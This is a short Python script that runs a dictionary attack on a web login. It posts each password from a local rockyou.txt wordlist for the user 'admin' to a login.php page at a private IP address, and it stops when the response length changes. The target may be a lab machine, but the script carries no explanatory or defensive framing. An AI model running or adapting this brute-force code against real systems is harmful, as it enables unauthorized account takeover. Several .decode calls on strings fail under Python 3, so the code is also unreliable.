#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
url = "http://10.51.0.25/login.php"
HX = "密码错误"
dir = open ("C:\\Users\\槐序\\Desktop\\rockyou.txt")
line = dir.readline()
i = 0
while line:
    line = line.strip('\n')
    d = {'email': 'admin', 'password': line, 'remember_me': 0}
    r = requests.post(url, data=d)
    print()
    line.decode('unicode_escape')
    if len(r.text) != 51:
        print("找到密码:" + str(i) + "\n" + r.text.decode("unicode_escape"))

        break
    line = dir.readline()
    i += 1
dir.close()